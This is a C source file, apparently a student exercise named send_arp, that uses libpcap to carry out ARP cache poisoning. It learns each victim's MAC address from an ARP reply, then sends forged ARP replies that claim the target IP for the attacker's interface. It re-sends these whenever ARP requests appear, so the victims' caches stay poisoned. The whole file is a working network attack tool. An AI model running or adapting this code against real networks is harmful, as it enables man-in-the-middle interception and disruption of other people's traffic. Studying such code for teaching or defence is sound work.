#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <pcap.h>
#include <net/if.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <arpa/inet.h>
#include <unistd.h>
#include "send_arp.h"



int main(int argc, char * argv[]){
    int num = (argc-2)/2;
    unsigned char** arp_packet = (unsigned char **)calloc(num, sizeof(char *));
    uint8_t reply_smac[6];
    char * dev = argv[1];
    char errbuf[PCAP_ERRBUF_SIZE];
    int fd;
    struct ifreq ifr;
    char *iface = dev;
    unsigned char *mac;
    fd = socket(AF_INET, SOCK_DGRAM, 0);
    ifr.ifr_addr.sa_family = AF_INET;
    strncpy(ifr.ifr_name , iface , IFNAMSIZ-1);
    ioctl(fd, SIOCGIFHWADDR, &ifr);
    close(fd);
    mac = (unsigned char *)ifr.ifr_hwaddr.sa_data;
    //----------------mac addr------------------

    printf("Mac : %.2x:%.2x:%.2x:%.2x:%.2x:%.2x\n" , mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
    for(int i=0; i<num; i++){
        arp_packet[i] = request(mac,argv[(i+1)*2+1], argv[(i+1)*2]);
        pcap_sendpacket(handle, arp_packet[i], 42);
        while (true){
            struct pcap_pkthdr* header;
            const unsigned char* packet;
            int res = pcap_next_ex(handle, &header, &packet);
            if (res == 0) continue;
            struct eth_header *eth = (struct eth_header *)packet;
            if(ntohs(eth->eth_type) == 0x0806) {
                struct arp_header *arp = (struct arp_header *)(packet + sizeof(*eth));
                if (ntohs(arp->opcode) == 0x0002){
                    for(int j=0; j<6; j++){
                        *(arp_packet[i]+j) = eth->smac[j];
                        *(arp_packet[i]+32+j) = eth->smac[j];
                    }
                    *(arp_packet[i]+21) = 0x02;
                    pcap_sendpacket(handle, arp_packet[i], 42);
                    printf("arp_packet[%d] success\n", i);
                    break;
                }
            }
        }
    }

    while (true){
        struct pcap_pkthdr* header;
        const unsigned char* packet;
        int res = pcap_next_ex(handle, &header, &packet);
        if (res == 0) continue;
        struct eth_header *eth = (struct eth_header *)packet;
        if(ntohs(eth->eth_type) == 0x0806) {
            struct arp_header *arp = (struct arp_header *)(packet + sizeof(*eth));
            int p=0;
            for(int i=0; i<6; i++){
                if(eth->dmac[i] == 0xff)
                    p++;
            }
            if (ntohs(arp->opcode) == 0x0001 && p == 6){
                for(int i=0; i<num; i++){
                    pcap_sendpacket(handle, arp_packet[i], 42);
                }
                printf("success case 1\n");
            }
            for(int i=0; i<num; i++){
                if (ntohs(arp->opcode) == 0x0001 && arp->dip == inet_addr(argv[(i+1)*2+1])){
                    pcap_sendpacket(handle, arp_packet[i], 42);
                    printf("success case %d\n",i+2);
                }
            }
        }
    }
    pcap_close(handle);
    for(int i=0; i<num; i++){
        free(arp_packet[i]);
    }
    free(arp_packet);
    return 0;
}
